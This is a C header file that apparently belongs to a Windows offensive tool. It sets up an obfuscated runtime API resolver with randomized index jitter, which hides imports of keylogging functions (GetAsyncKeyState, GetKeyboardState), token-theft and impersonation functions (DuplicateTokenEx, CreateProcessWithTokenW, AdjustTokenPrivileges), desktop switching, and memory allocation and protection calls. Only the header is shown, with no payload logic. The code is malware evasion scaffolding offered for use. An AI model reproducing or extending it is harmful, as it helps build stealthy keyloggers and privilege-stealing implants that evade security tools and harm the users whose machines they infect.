#pragma once

#include <Windows.h>
#include <math.h>
#include <time.h>
#include <stdio.h>
#include <TlHelp32.h>

// For LookupPrivilegeValueA
#pragma comment(lib, "advapi32.lib")

// Function declarations
void  InitApiResolver(void);
PVOID ApiResolver(unsigned int API);

// Some global values
#define APILENGTH 4                        // How many random values point to the real function. Really this is just "jitter" to add math
extern unsigned int ApiResolverCounter;    // This is used to not get array accesses optimized away into a single value.
extern unsigned int ApiResolverSeed;       // We are using rand() deterministically, so save the seed(). Not for crypto, its fine to use time()
extern PVOID ApiResolverAPIs[];

// typedefs 9711
typedef ATOM (WINAPI * RegisterClassExA_T)( CONST WNDCLASSEXA* );
typedef HWND (WINAPI * CreateWindowExA_T)( DWORD, LPCSTR, LPCSTR, DWORD, INT, INT, INT, INT, HWND, HMENU, HINSTANCE, LPVOID );
typedef BOOL (WINAPI * DispatchMessageA_T)( CONST MSG* );
typedef BOOL (WINAPI * TranslateMessage_T)( CONST MSG* );
typedef BOOL (WINAPI * GetMessageA_T)( LPMSG, HWND, UINT, UINT );
typedef BOOL (WINAPI * AdjustTokenPrivileges_T)( HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD );
typedef DWORD (WINAPI * GetModuleFileNameA_T)( HMODULE, LPSTR, DWORD );
typedef BOOL (WINAPI * Process32Next_T)( HANDLE, LPPROCESSENTRY32 );
typedef BOOL (WINAPI * Process32First_T)( HANDLE, LPPROCESSENTRY32 );
typedef BOOL (WINAPI * SetThreadDesktop_T)( HDESK );
typedef BOOL (WINAPI * CreateProcessWithTokenW_T)( HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION );
typedef BOOL (WINAPI * DuplicateTokenEx_T)( HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE );
typedef HANDLE (WINAPI * OpenProcess_T)( DWORD, BOOL, DWORD );
typedef HANDLE (WINAPI * CreateToolhelp32Snapshot_T)( DWORD, DWORD );
typedef INT (WINAPI * GetKeyNameTextW_T)( LONG, LPWSTR, INT );
typedef VOID* (WINAPI * memcpy_T)( VOID*, CONST VOID*, SIZE_T );
typedef BOOL (WINAPI * CloseHandle_T)( HANDLE );
typedef HANDLE (WINAPI * CreateFileMappingA_T)( HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR );
typedef BOOL (WINAPI * FreeLibrary_T)( HMODULE );
typedef HANDLE (WINAPI * CreateFileMappingW_T)( HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR );
typedef LPVOID (WINAPI * MapViewOfFile_T)( HANDLE, DWORD, DWORD, DWORD, SIZE_T );
typedef BOOL (WINAPI * GetKeyboardState_T)( PBYTE );
typedef SHORT (WINAPI * GetKeyState_T)( INT );
typedef ATOM (WINAPI * RegisterClassExW_T)( WNDCLASSEXW* );
typedef SHORT (WINAPI * GetAsyncKeyState_T)( INT );
typedef HDESK (WINAPI * OpenDesktopA_T)( LPCSTR, DWORD, BOOL, ACCESS_MASK );
typedef HANDLE (WINAPI * GetCurrentProcess_T)( VOID );
typedef BOOL (WINAPI * OpenProcessToken_T)( HANDLE, DWORD, PHANDLE );
typedef BOOL (WINAPI * GetUserNameA_T)( LPSTR, LPDWORD );
typedef LPVOID  (WINAPI * VirtualAlloc_T)( LPVOID, SIZE_T, DWORD, DWORD );
typedef BOOL  (WINAPI * VirtualProtect_T)( LPVOID, SIZE_T, DWORD, PDWORD );
typedef HMODULE (WINAPI * LoadLibraryA_T)( LPCSTR );
typedef FARPROC (WINAPI * GetProcAddress_T)( HMODULE, LPCSTR );
typedef BOOL (WINAPI * LookupPrivilegeValueA_T)( LPCSTR, LPCSTR, PLUID );


enum ApiOffsetOrder {
    ApiRegisterClassExA,
    ApiCreateWindowExA,
    ApiDispatchMessageA,
    ApiTranslateMessage,
    ApiGetMessageA,
    ApiAdjustTokenPrivileges,
    ApiGetModuleFileNameA,
    ApiProcess32Next,
    ApiProcess32First,
    ApiSetThreadDesktop,
    ApiCreateProcessWithTokenW,
    ApiDuplicateTokenEx,
    ApiOpenProcess,
    ApiCreateToolhelp32Snapshot,
    ApiGetKeyNameTextW,
    Apimemcpy,
    ApiCloseHandle,
    ApiCreateFileMappingA,
    ApiFreeLibrary,
    ApiCreateFileMappingW,
    ApiMapViewOfFile,
    ApiGetKeyboardState,
    ApiGetKeyState,
    ApiRegisterClassExW,
    ApiGetAsyncKeyState,
    ApiOpenDesktopA,
    ApiGetCurrentProcess,
    ApiOpenProcessToken,
    ApiGetUserNameA,
    ApiVirtualProtect,
    ApiVirtualAlloc,
    ApiLoadLibraryA,
    ApiGetProcAddress,
    ApiLookupPrivilegeValueA,
    ApiEnumCount
};

UINT apiresolverstruct[APILENGTH*ApiEnumCount];

// Name##_T -> VirtualProtect_T ; Api##Name -> ApiVirtualProtect
#define API_DEFINE(Name) ((Name##_T)ApiResolver(((UINT*)&apiresolverstruct)[APILENGTH*Api##Name + (ApiResolverCounter++ % APILENGTH)]))

// defines e56b
#define RegisterClassExA API_DEFINE(RegisterClassExA)
#define CreateWindowExA API_DEFINE(CreateWindowExA)
#define DispatchMessageA API_DEFINE(DispatchMessageA)
#define TranslateMessage API_DEFINE(TranslateMessage)
#define GetMessageA API_DEFINE(GetMessageA)
#define AdjustTokenPrivileges API_DEFINE(AdjustTokenPrivileges)
#define GetModuleFileNameA API_DEFINE(GetModuleFileNameA)
#define Process32Next API_DEFINE(Process32Next)
#define Process32First API_DEFINE(Process32First)
#define SetThreadDesktop API_DEFINE(SetThreadDesktop)
#define CreateProcessWithTokenW API_DEFINE(CreateProcessWithTokenW)
#define DuplicateTokenEx API_DEFINE(DuplicateTokenEx)
#define OpenProcess API_DEFINE(OpenProcess)
#define CreateToolhelp32Snapshot API_DEFINE(CreateToolhelp32Snapshot)
#define GetKeyNameTextW API_DEFINE(GetKeyNameTextW)
#define memcpy API_DEFINE(memcpy)
#define CloseHandle API_DEFINE(CloseHandle)
#define CreateFileMappingA API_DEFINE(CreateFileMappingA)
#define FreeLibrary API_DEFINE(FreeLibrary)
#define CreateFileMappingW API_DEFINE(CreateFileMappingW)
#define MapViewOfFile API_DEFINE(MapViewOfFile)
#define GetKeyboardState API_DEFINE(GetKeyboardState)
#define GetKeyState API_DEFINE(GetKeyState)
#define RegisterClassExW API_DEFINE(RegisterClassExW)
#define GetAsyncKeyState API_DEFINE(GetAsyncKeyState)
#define OpenDesktopA API_DEFINE(OpenDesktopA)
#define GetCurrentProcess API_DEFINE(GetCurrentProcess)
#define OpenProcessToken API_DEFINE(OpenProcessToken)
#define GetUserNameA API_DEFINE(GetUserNameA)
#define VirtualProtect API_DEFINE(VirtualProtect)
#define VirtualAlloc API_DEFINE(VirtualAlloc)
#define LoadLibraryA API_DEFINE(LoadLibraryA)
#define GetProcAddress API_DEFINE(GetProcAddress)
#define LookupPrivilegeValueA API_DEFINE(LookupPrivilegeValueA)